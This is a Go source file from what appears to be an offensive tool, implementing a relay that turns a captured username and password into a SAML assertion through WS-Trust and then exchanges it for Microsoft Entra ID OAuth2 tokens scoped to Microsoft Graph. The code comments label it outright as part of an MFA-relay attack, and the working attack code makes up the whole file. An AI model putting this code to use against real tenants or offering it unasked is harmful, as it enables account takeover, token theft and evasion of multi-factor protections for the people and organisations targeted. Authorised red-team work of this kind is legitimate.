package relay

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/Debajyoti0-0/aether/internal/protocol/oauth2"
	"github.com/Debajyoti0-0/aether/internal/protocol/wstrust"
	"github.com/Debajyoti0-0/aether/internal/types"
)

// AppliesToMicrosoftOnline is the standard applies-to for Entra ID.
const AppliesToMicrosoftOnline = "urn:federation:MicrosoftOnline"

// SAMLBearerGrant is the SAML 1.1 bearer grant type for Entra ID.
const SAMLBearerGrant = "urn:ietf:params:oauth:grant-type:saml1_1-bearer"

// WSTrustRelay performs the WS-Trust leg of an MFA-relay attack:
// credentials in, SAML assertion out, assertion exchanged for OAuth2.
type WSTrustRelay struct {
	STS       *wstrust.Client
	OAuth     *oauth2.Client
	Tenant    string
	ClientID  string
}

// RelayResult bundles both stages of the relay.
type RelayResult struct {
	Assertion *types.SAMLAssertion `json:"assertion_meta,omitempty"`
	AssertionRaw string           `json:"assertion_raw,omitempty"`
	Tokens    *types.OAuthTokens   `json:"tokens,omitempty"`
}

// Relay exchanges username/password for a SAML assertion, then for OAuth2.
func (r *WSTrustRelay) Relay(ctx context.Context, username, password, appliesTo string) (*RelayResult, error) {
	if appliesTo == "" {
		appliesTo = AppliesToMicrosoftOnline
	}

	assertion, err := r.STS.RequestSecurityToken(ctx, username, password, appliesTo)
	if err != nil {
		return nil, fmt.Errorf("ws-trust stage: %w", err)
	}

	result := &RelayResult{Assertion: assertion, AssertionRaw: assertion.Raw}

	tokens, err := r.ExchangeAssertion(ctx, assertion.Raw)
	if err != nil {
		return result, fmt.Errorf("saml exchange stage: %w", err)
	}
	result.Tokens = tokens
	return result, nil
}

// ExchangeAssertion swaps a base64 SAML assertion for OAuth2 tokens.
func (r *WSTrustRelay) ExchangeAssertion(ctx context.Context, assertionXML string) (*types.OAuthTokens, error) {
	if r.Tenant == "" {
		return nil, fmt.Errorf("tenant is required")
	}
	if r.ClientID == "" {
		return nil, fmt.Errorf("client_id is required")
	}

	b64 := base64.StdEncoding.EncodeToString([]byte(assertionXML))
	form := strings.NewReader(url.Values{
		"grant_type": {SAMLBearerGrant},
		"client_id":  {r.ClientID},
		"scope":      {"https://graph.microsoft.com/.default"},
		"assertion":  {b64},
	}.Encode())

	req, err := http.NewRequestWithContext(ctx, http.MethodPost,
		fmt.Sprintf("%s/%s/oauth2/v2.0/token", r.OAuth.BaseURL, r.Tenant), form)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := r.OAuth.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("saml exchange http %d: %s", resp.StatusCode, truncate(body, 512))
	}

	tokens := &types.OAuthTokens{}
	if err := json.Unmarshal(body, tokens); err != nil {
		return nil, err
	}
	tokens.IssuedAt = time.Now().UTC()
	if tokens.TokenType == "" {
		tokens.TokenType = "Bearer"
	}
	return tokens, nil
}

func truncate(b []byte, n int) string {
	if len(b) <= n {
		return string(b)
	}
	return string(b[:n]) + "..."
}
